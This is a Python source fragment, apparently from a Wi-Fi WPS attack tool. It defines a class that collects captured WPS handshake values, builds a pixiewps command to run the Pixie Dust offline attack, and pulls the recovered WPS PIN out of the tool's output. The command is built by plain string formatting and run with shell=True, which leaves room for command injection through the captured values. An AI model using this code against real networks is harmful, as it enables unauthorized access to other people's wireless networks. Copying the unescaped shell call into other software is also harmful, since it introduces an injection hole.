import subprocess
import sys

class Data:
    """Store data used for pixiewps command"""

    def __init__(self):
        self.PKE = ''
        self.PKR = ''
        self.E_HASH1 = ''
        self.E_HASH2 = ''
        self.AUTHKEY = ''
        self.E_NONCE = ''

    def clear(self):
        self.__init__()

    def getAll(self):
        return (self.PKE and self.PKR and self.E_NONCE and self.AUTHKEY
                and self.E_HASH1 and self.E_HASH2)

    def getPixieCmd(self, full_range: bool = False):
        # pylint: disable=consider-using-f-string
        pixiecmd = 'pixiewps --pke {} --pkr {} --e-hash1 {}' \
            ' --e-hash2 {} --authkey {} --e-nonce {}'.format(
                self.PKE, self.PKR, self.E_HASH1,
                self.E_HASH2, self.AUTHKEY, self.E_NONCE)

        if full_range:
            pixiecmd += ' --force'

        return pixiecmd

    def runPixieWps(self, showcmd: bool = False, full_range: bool = False):
        print('[*] Running Pixiewps…')
        cmd = self.getPixieCmd(full_range)

        if showcmd:
            print(cmd)

        r = subprocess.run(cmd,
                shell=True, encoding='utf-8', errors='replace',
                stdout=subprocess.PIPE, stderr=sys.stdout
            )

        print(r.stdout)

        if r.returncode == 0:
            lines = r.stdout.splitlines()
            for line in lines:
                if ('[+]' in line) and ('WPS pin' in line):
                    pin = line.split(':')[-1].strip()

                    if pin == '<empty>':
                        pin = '\'\''

                    return pin

        return False
